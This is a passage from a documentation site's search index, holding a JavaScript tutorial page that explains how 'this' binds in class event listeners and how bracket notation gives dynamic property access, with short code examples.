</p>"},{"location":"webdev/tiers/jsbasics/","title":"JavaScript","text":"<p>"},{"location":"webdev/tiers/jsbasics/#javascript-operators","title":"JavaScript Operators","text":""},{"location":"webdev/tiers/jsbasics/#difference-between-and","title":"Difference between === and ==","text":""},{"location":"webdev/tiers/jsbasics/#javascript-arrays","title":"JavaScript Arrays","text":""},{"location":"webdev/tiers/jsbasics/#filter","title":"filter()","text":""},{"location":"webdev/tiers/jsbasics/#map","title":"map()","text":""},{"location":"webdev/tiers/jsbasics/#foreach","title":"forEach()","text":""},{"location":"webdev/tiers/jsbasics/#some","title":"some()","text":""},{"location":"webdev/tiers/jsbasics/#flatmap","title":"flatMap()","text":""},{"location":"webdev/tiers/jsbasics/#reduce","title":"reduce()","text":""},{"location":"webdev/tiers/jsbasics/#practical-concepts-about-oop","title":"Practical Concepts about OOP","text":"<p>Yes you heard that right, its OOP(Object Oriented Programming) and not <code>oops!</code>.</p> <p>Example 1: What is this? Examine the below code carefully, when the private method <code>_onDown()</code> is called on an instance of <code>Cars</code> class, the event listener is not getting removed. Can you guess why? <pre><code>class Cars {\n    constructor(engine, opts) {\n        this._engine = engine;\n        this._opts = opts;\n    }\n\n    init() {\n        this._privateMethod();\n    }\n\n    #################### Private methods ##############################\n\n    _privateMethod() {\n        // Doing something that is only requierd by an instance of this class.\n    }\n\n    _bind() {\n        certificate.register((e) =&gt; {\n            if (!onClick)\n                document.addEventListener('mousedown', this._onDown);\n\n            if (onClick) {\n                document.removeEventListener('mousedown', this._onDown);\n            }\n        });\n    }\n\n    _onDown() {\n        console.log(this._onDown); // Prints 'undefined' in the console.\n        document.removeEventListener('mousedown', this._onDown);\n    }\n\n    #################### Public methods ##############################\n}\n</code></pre></p> <p>If <code>console.log(this._onDown)</code> returns <code>undefined</code>, it suggests that the <code>_onDown</code> function is not bound to the current object instance correctly, or it might not be defined in the context where you expect it to be. In JavaScript, the value of this inside a function depends on how the function is called. If the function is called as a method of an object (e.g., object.method()), then this refers to the object itself. Otherwise, in functions called without a context, this typically refers to the global object (in non-strict mode) or undefined (in strict mode).</p> <p>To ensure that <code>_onDown</code> is properly bound to the correct this, you might need to use arrow functions or explicitly bind the function to a specific context.</p> <p>Solution-A You can explicitly bind the function to a specific context. In this example, _onDown is explicitly bound to the current object instance within the constructor function using the bind() method. This ensures that this inside _onDown refers to the correct object instance.</p> <pre><code>class Cars {\n    constructor(engine, opts) {\n        this._onDown = this._onDown.bind(this);\n    }\n}\n</code></pre> <p>Solution-B Alternatively, you can use arrow functions. With arrow functions, this lexically refers to the enclosing context, which means it retains the value of this from the surrounding code.</p> <pre><code>class Cars {\n    _onDown = () =&gt; {\n        document.removeEventListener('mousedown', this._onDown);\n    }\n}\n</code></pre> <p>Example 2: Objects in JavaScript This works but how is that possible? s[method] is s.setDev, if method = 'setDev' so where is that . coming from?</p> <pre><code>modules.forEach((m) =&gt; {\n    if (m !== this._module) {\n        let opts = { moduleType: value };\n        let method = '';\n\n        if (m.getType() === 'web') {\n            method = 'setDev';\n        } else if (m.getType() === 'security') {\n            method = 'setMalware';\n        }\n\n        return s[method](opts);\n    }\n});\n</code></pre> <p>You're correct to question that. In JavaScript, when you use square brackets ([]) to access a property of an object, you can use a variable to specify the property name dynamically. For example, if you have an object <code>obj</code> and you want to access its property <code>prop</code>, you can use <code>obj[prop]</code>. If prop has a value of 'foo', then <code>obj[prop]</code> is equivalent to <code>obj.foo</code>. In your case, <code>s[method]</code> is equivalent to <code>s['setDev']</code>, and because method is 'setDev', it resolves to <code>s.setDev</code>. This feature is often used for dynamic property access or dynamic method invocation in JavaScript. It's a powerful tool for writing flexible and concise code.</p>"}]}